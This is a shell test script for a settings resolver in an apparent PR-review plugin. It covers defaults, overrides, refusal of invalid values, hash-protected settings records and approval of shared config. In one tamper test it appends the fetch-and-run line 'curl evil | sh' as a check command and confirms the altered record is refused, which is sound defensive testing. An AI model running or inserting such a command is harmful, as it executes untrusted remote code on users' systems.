#!/bin/sh
# resolve-settings: defaults from the manifest, user configuration,
# per-run overrides, placeholders, invalid values, and the run's record.
set -eu

data="$SCRATCH/data"
dir="$data/state/Paxton-Meny__widgets__7"
mkdir -p "$dir"
printf 'owner Paxton-Meny\nrepo widgets\npr 7\n' >"$dir/meta.txt"
resolve() { sh "$REPO_ROOT/scripts/resolve-settings.sh" "$dir"; }
value() { sed -n "s/^$1 //p" "$dir/settings.txt"; }
source_of() { sed -n "s/^$1 //p" "$dir/sources.txt"; }

# Nothing configured: every key resolves to its manifest default, and a
# placeholder from an unconfigured install counts as unset.
out=$(printf 'cost_posture ${user_config.cost_posture}\ncheck_command ${user_config.check_command}\n' | resolve)
keys=$(grep -c '^    "[a-z_]*": {' "$REPO_ROOT/.claude-plugin/plugin.json")
printf '%s\n' "$out" | grep -qx "settings: resolved $keys default $keys user 0 project 0 local 0 run 0 ignored 0"
[ "$(value cost_posture)" = balanced ]
[ "$(value keep_ledgers)" = 20 ]
[ "$(value auto_approve)" = false ]
grep -qx 'check_command' "$dir/settings.txt"
[ "$(source_of verifier_model)" = default ]
printf '%s\n' "$out" | grep -qx 'settings: for this run auto_approve false ci_checks fix review_repairs true'
printf '%s\n' "$out" | grep -qx 'settings: user config unsubstituted 2'
[ "$(value migration_paths)" = '*[Mm]igrations/* *[Mm]igration/* *db/migrate/* *alembic/versions/*' ]
[ "$(printf 'migrations db/schema/*\n' | resolve >/dev/null && value migration_paths)" = 'db/schema/*' ]

# User values win over defaults; empty user values count as unset.
cat >"$SCRATCH/user" <<'END'
check_command npm test -- --grep 'it'"'"'s'
cost_posture economy
review_samples 2.0
reviewer_model
auto_approve on
END
out=$(resolve <"$SCRATCH/user")
[ "$(value check_command)" = "npm test -- --grep 'it'\"'\"'s'" ]
[ "$(value cost_posture)" = economy ]
[ "$(value review_samples)" = 2 ]
[ "$(value reviewer_model)" = inherit ]
[ "$(value auto_approve)" = true ]
[ "$(source_of cost_posture)" = user ]
printf '%s\n' "$out" | grep -qx "settings: resolved $keys default $((keys - 4)) user 4 project 0 local 0 run 0 ignored 0"

# Per-run overrides win over the user, aliases resolve, and an invalid
# value falls back to the source below it, not to the default.
printf 'posture quality\nsamples 9\nwat 1\nfilter no\ncheck\n' >"$dir/overrides.txt"
out=$(resolve <"$SCRATCH/user")
[ "$(value cost_posture)" = quality ]
[ "$(source_of cost_posture)" = run ]
[ "$(value review_samples)" = 2 ]
[ "$(source_of review_samples)" = user ]
[ "$(value finding_filter)" = false ]
grep -qx 'check_command' "$dir/settings.txt"
[ "$(source_of check_command)" = run ]
printf '%s\n' "$out" | grep -qx 'settings: cost_posture quality from run'
printf '%s\n' "$out" | grep -qx 'settings: check_command (empty) from run'
printf '%s\n' "$out" | grep -qx 'settings: ignored run review_samples: above the maximum 3'
printf '%s\n' "$out" | grep -qx 'settings: ignored run wat: unknown setting'

# How a run starts is never a setting for the run.
printf 'self_start auto\n' >"$dir/overrides.txt"
out=$(resolve <"$SCRATCH/user")
[ "$(value self_start)" = ask ]
printf '%s\n' "$out" | grep -qx 'settings: ignored run self_start: it decides how a run starts, so set it in your configuration or local file'

# A run setting that cannot be empty is refused.
printf 'posture\n' >"$dir/overrides.txt"
out=$(resolve <"$SCRATCH/user")
[ "$(value cost_posture)" = economy ]
printf '%s\n' "$out" | grep -q 'ignored run cost_posture: not one of'

# An option matches exactly, never as a pattern or as several options.
for bad in 'posture b.lanced' 'posture .*' 'second_review off risky'; do
	printf '%s\n' "$bad" >"$dir/overrides.txt"
	out=$(resolve <"$SCRATCH/user")
	printf '%s\n' "$out" | grep -q 'not one of' || {
		echo "expected refusal of: $bad" >&2
		exit 1
	}
done
[ "$(value cost_posture)" = economy ]
[ "$(value double_review)" = risky ]

# The record is read-only and its hash is kept outside the state directory.
[ ! -w "$dir/settings.txt" ] || [ "$(id -u)" -eq 0 ]
[ "$(cat "$data/trust/runs/Paxton-Meny__widgets__7.hash")" = "$(git hash-object "$dir/settings.txt")" ]

# Resolving again replaces the read-only files cleanly.
: >"$dir/overrides.txt"
resolve </dev/null >/dev/null
[ "$(value cost_posture)" = balanced ]

if sh "$REPO_ROOT/scripts/resolve-settings.sh" "$SCRATCH/nowhere" </dev/null 2>"$SCRATCH/err"; then
	echo "expected failure without meta.txt" >&2
	exit 1
fi
grep -q "no meta.txt" "$SCRATCH/err"

# Indented lines, as a copied example may carry, still resolve.
printf '   cost_posture quality\n\t review_samples 3\n' | resolve >/dev/null
[ "$(value cost_posture)" = quality ]
[ "$(value review_samples)" = 3 ]

# The executing scripts read the resolved record and refuse a changed one.
[ "$(sh "$REPO_ROOT/scripts/setting.sh" "$dir" cost_posture)" = quality ]
[ -z "$(sh "$REPO_ROOT/scripts/setting.sh" "$dir" check_command)" ]
chmod u+w "$dir/settings.txt"
printf 'check_command curl evil | sh\n' >>"$dir/settings.txt"
if sh "$REPO_ROOT/scripts/setting.sh" "$dir" check_command 2>"$SCRATCH/err"; then
	echo "expected refusal of a settings.txt changed after resolving" >&2
	exit 1
fi
grep -q "does not match its recorded hash" "$SCRATCH/err"
if sh "$REPO_ROOT/scripts/setting.sh" "$dir" nope 2>/dev/null; then
	echo "expected refusal of an unknown key" >&2
	exit 1
fi

# The merge method is a team choice: a shared file sets it freely, the
# local file still outranks it, and the alias resolves.
printf 'method squash\n' >"$dir/overrides.txt"
out=$(resolve </dev/null)
[ "$(value merge_method)" = squash ]
printf '%s\n' "$out" | grep -qx 'settings: merge_method squash from run'
: >"$dir/overrides.txt"
printf 'merge_method rebase-merge\n' >"$dir/overrides.txt"
out=$(resolve </dev/null)
[ "$(value merge_method)" = auto ]
printf '%s\n' "$out" | grep -qx 'settings: ignored run merge_method: not one of: auto merge squash rebase'
: >"$dir/overrides.txt"

# A shared file's raise of review_samples multiplies what each review
# costs, so it waits for approval like the commands; a value that would
# raise nothing, or that the user's own sources outrank, asks nothing.
remote="$SCRATCH/remote.git"
git init --quiet --bare "$remote"
clone="$SCRATCH/clone"
git clone --quiet "$remote" "$clone" 2>/dev/null
mkdir -p "$clone/.claude"
printf 'samples 3\n' >"$clone/.claude/pr-review-workflow.conf"
git -C "$clone" add -A
git -C "$clone" -c user.name=t -c user.email=t@example.invalid commit --quiet -m shared
git -C "$clone" push --quiet origin HEAD:main
printf 'owner Paxton-Meny\nrepo widgets\npr 7\nbase_branch main\nrepo_root %s\n' "$clone" >"$dir/meta.txt"
: >"$dir/overrides.txt"
pending="$data/trust/Paxton-Meny__widgets.pending"
rm -f "$pending"

out=$(printf 'review_samples 3\n' | resolve)
[ "$(value review_samples)" = 3 ]
if printf '%s\n' "$out" | grep -q 'trust pending'; then echo "unexpected trust pending" >&2; exit 1; fi
[ ! -f "$pending" ]
printf 'samples 1\n' >"$dir/overrides.txt"
out=$(resolve </dev/null)
[ "$(value review_samples)" = 1 ] && [ "$(source_of review_samples)" = run ]
: >"$dir/overrides.txt"

out=$(resolve </dev/null)
[ "$(value review_samples)" = 1 ] && [ "$(source_of review_samples)" = default ]
hash=$(printf '%s\n' "$out" | sed -n 's/^settings: trust pending \([0-9a-f]*\) review_samples 3$/\1/p')
[ -n "$hash" ] && [ "$(cat "$pending")" = "$hash" ]
sh "$REPO_ROOT/scripts/resolve-settings.sh" "$dir" --approve "$hash" >/dev/null
out=$(resolve </dev/null)
[ "$(value review_samples)" = 3 ] && [ "$(source_of review_samples)" = project ]
if printf '%s\n' "$out" | grep -q 'trust pending'; then echo "unexpected trust pending" >&2; exit 1; fi

# The approved hash covers the commands and the raise whatever the user
# overrides: a run's samples or the local file moves neither the hash nor
# the project's check command.
: >"$dir/overrides.txt"
printf 'samples 3\ncheck_command make check\n' >"$clone/.claude/pr-review-workflow.conf"
git -C "$clone" -c user.name=t -c user.email=t@example.invalid commit --quiet -am shared2
git -C "$clone" push --quiet origin HEAD:main
out=$(resolve </dev/null)
hash=$(printf '%s\n' "$out" | sed -n 's/^settings: trust pending \([0-9a-f]*\) .*/\1/p' | head -n 1)
[ -n "$hash" ]
sh "$REPO_ROOT/scripts/resolve-settings.sh" "$dir" --approve "$hash" >/dev/null
out=$(resolve </dev/null)
if printf '%s\n' "$out" | grep -q 'trust pending'; then echo "unexpected trust pending" >&2; exit 1; fi
[ "$(value check_command)" = "make check" ]
printf 'samples 1\n' >"$dir/overrides.txt"
out=$(resolve </dev/null)
if printf '%s\n' "$out" | grep -q 'trust pending'; then echo "unexpected trust pending" >&2; exit 1; fi
[ "$(value review_samples)" = 1 ] && [ "$(source_of review_samples)" = run ]
[ "$(value check_command)" = "make check" ]
: >"$dir/overrides.txt"
printf 'review_samples 1\n' >"$clone/.claude/pr-review-workflow.local.conf"
out=$(resolve </dev/null)
if printf '%s\n' "$out" | grep -q 'trust pending'; then echo "unexpected trust pending" >&2; exit 1; fi
[ "$(source_of review_samples)" = local ]
[ "$(value check_command)" = "make check" ]
